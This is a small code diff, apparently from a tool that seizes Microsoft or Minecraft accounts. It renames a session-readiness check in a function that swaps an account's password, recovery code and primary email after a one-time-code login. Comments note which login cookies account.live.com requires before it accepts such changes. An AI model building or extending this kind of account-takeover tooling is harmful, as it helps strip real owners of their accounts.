@@ -5,7 +5,10 @@ from securing.build_embeds import (
     build_failure_embed,
     public_secure_reason,
 )
-from securing.auth.polish_host import login_session_ready, polish_host
+from securing.auth.polish_host import (
+    polish_host,
+    security_session_ready,
+)
 from securing.auth.get_msaauth import get_msaauth
 from securing.auth.initial_session import get_session, clone_session_new_proxy
 from securing.utils.secure import secure
@@ -244,7 +247,7 @@ async def startSecuringAccount(session: httpx.AsyncClient, email, device = None,
                 logging.exception("polish_host failed — continuing with existing cookies")
                 print("[!] - polish_host raised; continuing with existing cookies")
             print(f"[~] - Polished MSAAUTH")
-            if not login_session_ready(session):
+            if not security_session_ready(session):
                 # Diagnostics only — securing.utils.secure retries the login
                 # itself before the MC check when this is still broken.
                 print(
@@ -372,7 +375,7 @@ async def startSecuringAccount(session: httpx.AsyncClient, email, device = None,
             "Could not change password, recovery code, or primary email. "
             "The original login is still active."
         )
-        if not login_session_ready(session):
+        if not security_session_ready(session):
             # login.live.com never handed out WLSSC/AMCSecAuth after the OTP, so
             # every account.live.com change is refused (6001). Tell the user the
             # real cause instead of a generic "could not change".
